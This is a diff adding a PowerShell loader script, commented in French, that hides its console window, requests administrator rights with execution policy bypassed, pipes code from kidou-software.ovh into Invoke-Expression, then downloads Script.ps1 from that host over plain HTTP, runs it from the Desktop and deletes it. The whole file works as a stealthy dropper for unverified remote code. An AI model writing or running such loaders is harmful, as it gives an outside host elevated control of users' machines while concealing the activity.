@@ -1,0 +1,52 @@
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class ConsoleWindow {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        public const int SW_HIDE = 0;
+    }
+"@
+
+$consolePtr = [ConsoleWindow]::GetConsoleWindow()
+
+[ConsoleWindow]::ShowWindow($consolePtr, [ConsoleWindow]::SW_HIDE)
+
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+
+if (-not $isAdmin) {
+    # Si l'utilisateur n'est pas administrateur, demander des privilÃ¨ges administratifs
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"`&(irm http://kidou-software.ovh/dev | iex)`"" -Verb RunAs
+    exit
+}
+
+$ErrorActionPreference = "Stop"
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'http://kidou-software.ovh/Script.ps1'
+
+$rand = Get-Random -Maximum 99999999
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$DesktopPath = [Environment]::GetFolderPath("Desktop")
+$FilePath = if ($isAdmin) { "$DesktopPath\Script.ps1" } else { "$DesktopPath\Script.ps1" }
+
+try {
+    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
+}
+catch {
+    Write-Host "Une erreur est survenue: $_"
+    exit
+}
+
+$ScriptArgs = "$args "
+$content = $prefix + $response
+Set-Content -Path $FilePath -Value $content
+
+Start-Process powershell.exe -ArgumentList "-NoExit", "-File", "`"$FilePath`"" -Wait
+
+if (Test-Path $FilePath) {
+    Remove-Item $FilePath
+}
+exit
